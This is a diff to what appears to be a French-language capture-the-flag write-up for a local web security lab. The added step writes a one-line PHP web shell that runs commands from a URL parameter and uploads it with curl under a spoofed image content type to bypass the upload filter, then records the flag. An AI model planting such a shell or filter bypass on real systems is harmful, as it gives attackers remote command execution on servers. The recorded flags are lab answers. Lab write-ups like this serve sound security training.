@@ -92,7 +92,21 @@ print("\n[-] Attack completed. No password found.")
 
 The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
 
-5.❌
+5.✅
+// 1. On cree un fichier php pour executer des commandes 
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+// 2. On upload le fichier 
+
+curl -s -H "Content-Type: multipart/form-data" \
+  -F Upload=Upload \
+  -F "uploaded=@shell.php;type=image/jpeg" \
+  "http://localhost:8080/index.php?page=upload"
+
+Ensuite il va cat automatiquement le contenu de la page
+
+THe flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
+
+6.❌
 ```
 
 
